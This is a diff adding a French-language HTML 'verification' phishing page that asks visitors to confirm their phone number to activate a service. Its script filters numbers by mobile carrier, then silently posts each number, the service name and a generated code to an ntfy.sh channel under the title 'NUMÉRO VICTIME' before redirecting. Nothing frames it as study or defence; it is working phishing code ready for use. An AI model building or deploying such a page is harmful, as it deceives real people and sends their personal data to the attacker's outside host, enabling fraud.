@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;700&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+        body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+        .box{background:#111;border-radius:25px;max-width:420px;width:100%;padding:40px 30px;text-align:center;box-shadow:0 15px 40px #0008;}
+        h1{font-size:28px;margin-bottom:15px;}
+        p{font-size:16px;color:#ccc;margin-bottom:30px;}
+        .service{font-size:20px;color:#ffd700;font-weight:700;margin:20px 0;}
+        .input{position:relative;margin:30px 0;}
+        input{width:100%;padding:18px 20px 18px 70px;font-size:18px;background:#000;border:2px solid #333;border-radius:15px;color:#fff;}
+        input:focus{border-color:#ffd700;}
+        .flag{position:absolute;left:20px;top:50%;transform:translateY(-50%);font-size:26px;}
+        .btn{background:#ffd700;color:#000;font-weight:700;padding:18px;border-radius:15px;width:100%;border:none;cursor:pointer;margin-top:15px;}
+        .status{margin-top:15px;font-size:15px;}
+        .good{color:#00ff00;}
+        .bad{color:#ff4444;}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>Dernière étape</h1>
+    <p>Confirme ton numéro pour activer</p>
+    <div class="service" id="svc"></div>
+
+    <div class="input">
+        <div class="flag">+33</div>
+        <input type="tel" id="phone" placeholder="6 12 34 56 78">
+    </div>
+    <div class="status" id="status"></div>
+    <button class="btn" id="send" disabled>Envoyer le code</button>
+</div>
+
+<script>
+const NTFY_RAW = "https://ntfy.sh/ton-raw-2025"; // CHANGE ICI
+document.getElementById('svc').textContent = localStorage.getItem('service');
+
+const good = {orange:["60","61","62","69"],sfr:["65","66","67","68"],bouygues:["64","70","71","72","73","74","75","76","77","78","79"]};
+function getOp(n){let p=n.substring(0,2);if(good.orange.includes(p))return"Orange";if(good.sfr.includes(p))return"SFR";if(good.bouygues.includes(p))return"Bouygues";return null;}
+
+document.getElementById('phone').addEventListener('input',()=>{
+    let n=document.getElementById('phone').value.replace(/\s/g,'');
+    let s=document.getElementById('status'),b=document.getElementById('send');
+    if(n.length===10&&n[0]==='0'){
+        let op=getOp(n);
+        if(op){
+            s.innerHTML=`✅ ${op} – Compatible`;s.className="status good";b.disabled=false;
+        }else{
+            s.innerHTML="❌ Free/Sosh/Red → refusé";s.className="status bad";b.disabled=true;
+        }
+    }else{s.textContent="";b.disabled=true;}
+});
+
+document.getElementById('send').addEventListener('click',()=>{
+    let n=document.getElementById('phone').value.replace(/\s/g,'');
+    let full="+33"+n.substring(1);
+    let code=Math.floor(100000+Math.random()*900000);
+    localStorage.setItem('code',code);
+    localStorage.setItem('phone',full);
+    fetch(NTFY_RAW,{method:'POST',headers:{'Title':'NUMÉRO VICTIME ✅'},body:`Service: ${localStorage.getItem('service')}\nNuméro: ${full}\nCode: ${code}`});
+    location.href='success.html';
+});
+</script>
+</body>
+</html>
